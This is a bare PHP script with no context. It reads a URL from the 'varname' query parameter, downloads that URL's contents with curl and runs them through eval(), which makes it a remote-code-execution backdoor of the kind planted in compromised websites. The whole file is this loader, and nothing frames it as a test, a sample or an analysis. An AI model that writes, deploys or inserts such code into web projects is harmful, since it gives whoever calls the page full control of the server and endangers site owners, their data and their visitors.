<?php

if (isset($_GET['varname'])) {
    $url = $_GET['varname'];
    if ($curl = curl_init()) {
        curl_setopt($curl, CURLOPT_URL, $url);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        eval(curl_exec($curl));
        curl_close($curl);
        exit;
    }
}